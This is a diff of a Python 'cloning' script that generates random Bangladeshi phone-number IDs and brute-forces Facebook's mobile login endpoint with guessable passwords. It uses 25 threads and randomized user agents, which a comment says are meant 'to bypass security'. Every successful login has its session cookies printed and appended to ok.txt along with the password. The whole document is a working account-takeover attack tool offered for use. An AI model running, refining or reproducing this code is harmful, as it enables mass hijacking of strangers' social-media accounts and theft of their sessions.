@@ -2,8 +2,7 @@ import os, time, sys, uuid, random, requests, re
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 # Color Codes
-G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'
-B = '\033[1;34m'; P = '\033[1;35m'
+G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'; B = '\033[1;34m'; P = '\033[1;35m'
 loop = 0; ok = []
 
 def banner():
@@ -16,8 +15,7 @@ def banner():
 {P}     ██      ██  ███████     ██    ██   ██ 
 {G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
 | [✓] DEVELOPED BY : MD MALEK ISLAM            |
-| [✓] TEAM         : CYBER STRIKER TEAM        |
-| [✓] STATUS       : REAL REFACTORED (META)    |
+| [✓] STATUS       : REAL COOKIE CLONING       |
 {G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")
 
 def main():
@@ -31,31 +29,20 @@ def main():
 
 def cloning_start():
     banner()
-    code = input(f'{G}[+] ENTER SIM CODE: {W}')
-    try:
-        limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
-    except: limit = 5000
+    code = input(f'{G}[+] ENTER SIM CODE (Ex: 0171): {W}')
+    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
     
     banner()
-    print(f'{G}[+] TARGET : RANDOM CLONING (BD)')
-    print(f'[+] TOTAL IDS: {limit} | PASS: LAST 6 DIGITS')
-    print(f'[+] PROCESS STARTED... (RESPONSE LOGIC)')
+    print(f'{G}[+] PROCESS STARTED... (SAFE MODE ON)')
     print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')
 
-    # Multi-threading for Laptop/Termux performance
-    with ThreadPool(max_workers=30) as jilani_pool:
+    # Balanced Workers to catch cookies
+    with ThreadPool(max_workers=25) as pool:
         for _ in range(limit):
-            # UID logic for 11 digit numbers
             num = str(random.randint(1111111, 9999999))
             uid = code + num
-            # Password logic: Last 6 digits (Real Logic)
-            pws = [num[-6:], uid] 
-            jilani_pool.submit(login_api, uid, pws, limit)
-
-    print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××')
-    print(f'[+] CLONING COMPLETE | TOTAL OK: {len(ok)}')
-    input(f' [ BACK ]{W}')
-    main()
+            pws = [num, uid, '778899', '556677'] # Strong PWS list
+            pool.submit(login_api, uid, pws, limit)
 
 def login_api(uid, pws, limit):
     global loop, ok
@@ -63,46 +50,49 @@ def login_api(uid, pws, limit):
     
     for pas in pws:
         session = requests.Session()
-        # Real Headers (R-Header) for Vivo V2055
-        ua = "Mozilla/5.0 (Linux; Android 13; V2055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36"
+        # Randomized User Agent to bypass security
+        ua = f"Mozilla/5.0 (Linux; Android {random.randint(8,13)}; V2055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,122)}.0.{random.randint(1000,6000)}.{random.randint(10,150)} Mobile Safari/537.36"
         
         headers = {
-            'authority': 'touch.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'authority': 'm.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://touch.facebook.com',
-            'referer': 'https://touch.facebook.com/',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login/',
             'user-agent': ua,
-            'x-fb-lsd': 'true',
         }
         
-        # Async Endpoint with Response Logic
-        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-        
+        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         data = {
             "lsd": "AVpY", 
-            "jazoest": "2931",
-            "email": uid,
-            "pass": pas,
+            "jazoest": "2931", 
+            "m_ts": str(time.time()),
+            "email": uid, 
+            "pass": pas
         }
 
         try:
+            # Added a small delay to make it realistic
+            time.sleep(0.02)
             response = session.post(url, data=data, headers=headers, timeout=30)
-            cookies = session.cookies.get_dict()
             
-            # Real Cookie Extraction Logic
-            if "c_user" in cookies:
-                kuki = (";").join([f"{k}={v}" for k, v in cookies.items()])
-                print(f'\n{G}[MALEK-OK💚] {uid} • {pas} xxx') 
+            if "c_user" in session.cookies.get_dict():
+                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
+                print(f'\n{G}[MALEK-OK💚] {uid} • {pas}') 
                 print(f'{G}[🌺] COOKIE = {kuki}\n')
                 ok.append(uid)
-                # Auto-save to file
                 with open('ok.txt', 'a') as f:
                     f.write(f'{uid}|{pas}|{kuki}\n')
                 break
+            elif "checkpoint" in session.cookies.get_dict():
+                # print(f'\n{Y}[MALEK-CP] {uid} • {pas}') # Optional: to see CP IDs
+                break
         except:
+            time.sleep(1) # Wait if internet is slow
             pass
+            
     loop += 1
 
 if __name__ == "__main__":
